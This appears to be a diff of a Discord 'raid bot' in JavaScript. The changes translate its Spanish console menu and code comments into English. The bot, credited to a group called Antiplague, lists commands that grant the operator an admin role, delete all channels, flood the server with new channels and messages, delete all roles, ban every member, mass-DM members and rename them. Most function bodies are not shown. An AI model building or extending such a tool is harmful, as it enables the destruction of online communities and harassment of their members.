@@ -10,26 +10,26 @@ console.log(chalk.red(`IMPORTANT, if you are going to edit the codes, just chang
  console.log(chalk.white(""));   
  console.log("                          ");   
 
-   console.log(chalk.blue("Iniciando bot raid..."));
+   console.log(chalk.blue("Starting bot raid ..."));
    console.log("   ")  
-   console.log(chalk.blue(`Cliente ${client.user.tag} listo para el raid!`));  
-   console.log(chalk.blue("$help para mas ayuda"));  
+   console.log(chalk.blue(`Cliente ${client.user.tag}ready for the raid...`));  
+   console.log(chalk.blue(". . ."));  
    console.log("      ") 
-   console.log(chalk.red(`   [?] Comandos de raid:
+   console.log(chalk.red(`    [?] Raid commands:
 
-   [!] | $1 [Admin] | $2 [Nuke] | $3 [Raid automatico] | $4 [Raid] |
+   [!] | $ 1 [Admin] | $ 2 [Nuke] | $ 3 [Automatic Raid] | $ 4 [Raid] |
 
-   [?] Comandos de modificaciones:
+   [?] Modification commands:
 
-   [!] | $5 [Elimina roles] | $6 [Agrega roles] |
+   [!] | $ 5 [Delete roles] | $ 6 [Add roles] |
    
-   [?] Comandos para usuarios:
+   [?] Commands for users:
    
-   [!] | $7 [Ban all] | $8 [Md all] | $9 <name> [Nombre users] |
+   [!] | $ 7 [Ban all] | $ 8 [Md all] | $ 9 <name> [Users name] |
    
-   [?] Comandos de informacion
+   [?] Information commands
    
-   [!] | $10 [Lista server] |`))
+   [!] | $ 10 [server list] |`))
 
    console.log("      ")
    console.log(chalk.blue(`These codes are the property of Antiplague. | discord.gg/antiplague`))
@@ -41,13 +41,13 @@ function presencia(){
    client.user.setPresence({
    status: "dnd",
    activity: {
-   name: "$help",
+   name: ". . .",
    type: "PLAYING"
      }
    });
 }
 
-//Rol Admin: El bot crea un rol con Admin y te lo da. [$1]
+//Admin role: The bot creates a role with Admin and gives it to you. [$ 1]
 
 client.on("message", async msg => {
    if (msg.author.bot) return;
@@ -68,7 +68,7 @@ msg.member.roles.add(rol)
    }
 });
 
-//Nuke: Borra todos los Canales del Servidor. [$2]
+//Nuke: Delete all Channels from the Server. [$ 2]
 
 client.on("message", message => {
    if (message.author.bot) return;
@@ -84,7 +84,7 @@ client.on("message", message => {
    }
 })
  
-//Raid Automatico: Raid Automatico (Borra y crea canales y hace flood). [$3]
+//Automatic Raid: Automatic Raid (Deletes and creates channels and floods). [$ 3]
  
 client.on("message", message => {
    if(message.author.bot) return;
@@ -151,7 +151,7 @@ client.on("message", message => {
    }
 })
 
-//Raid: Crea canales y hace flood. [$4]
+//Raid: Create channels and flood. [$ 4]
 
 client.on("message", message => {
    if (message.author.bot) return;
@@ -209,7 +209,7 @@ client.on("message", message => {
    }
 });
 
-//Borrar Roles: Borra todos los roles del Servidor. [$5]
+//Delete Roles: Delete all the roles of the Server. [$ 5]
 
 client.on("message", message => {
    if (message.author.bot) return;
@@ -220,7 +220,7 @@ client.on("message", message => {
    }
 });
 
-//Crear Roles: Crea Roles al Servidor. [$6]
+//Create Roles: Create Roles to the Server. [$ 6]
 
 client.on("message", message => {
    if (message.author.bot) return;
@@ -233,7 +233,7 @@ client.on("message", message => {
    }
 });
 
-//Ban All: Banea a todos los meimbros del Servidor. [$7]
+//Ban All: Ban all members of the Server. [$ 7]
 
 client.on("message", async message => {
    if(message.content.startsWith('$7')){
@@ -246,7 +246,7 @@ client.on("message", async message => {
    })
 }});
 
-//Mensajes Directos: Envia MD a los miembros del Servidor. [$8]
+//Direct Messages: Send DM to the members of the Server. [$ 8]
 
 client.on("message", message => {
    if (message.author.bot) return;
@@ -260,7 +260,7 @@ client.on("message", message => {
    })
 });
 
-//nickall: Cambia el Nombre de los Miembros. [$9]
+//Nickall: Change the Name of the Members. [$ 9]
 
 client.on("message", msg => {
    const args = msg.content.slice().trim().split(/ +/g );
@@ -281,7 +281,7 @@ client.on("message", msg => {
   }
 });
 
-//Lista: Muestra la Lista de informacion del Servidor. [$10]
+//List: Shows the List of Server information. [$ 10]
 
 client.on("message", message => {
    if (message.author.bot) return;
